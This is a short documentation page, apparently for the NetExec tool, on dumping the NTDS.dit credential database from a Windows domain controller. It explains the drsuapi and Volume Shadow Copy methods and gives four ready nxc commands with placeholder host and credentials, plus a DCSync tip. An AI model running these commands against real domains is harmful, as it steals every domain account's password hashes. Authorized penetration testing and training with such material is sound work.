@@ -1,0 +1,29 @@
+# Dump NTDS.dit
+
+### Dump the NTDS.dit from target DC using methods from secretsdump.py
+
+{% hint style="danger" %}
+Requires Domain Admin or Local Admin Priviledges on target Domain Controller
+{% endhint %}
+
+```
+2 methods are available:   
+(default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with   
+						additional drsuapi calls to convert the resultant linked-lists into readable format  
+			vss - Uses the Volume Shadow copy Service  
+```
+
+```
+#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
+#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
+#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
+#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+```
+
+{% hint style="info" %}
+You can also DCSYNC with the computer account of the DC
+{% endhint %}
+
+Remember to play this music everytime you got DA
+
+{% embed url="https://www.youtube.com/watch?v=SyjUwhBYa6Q" %}
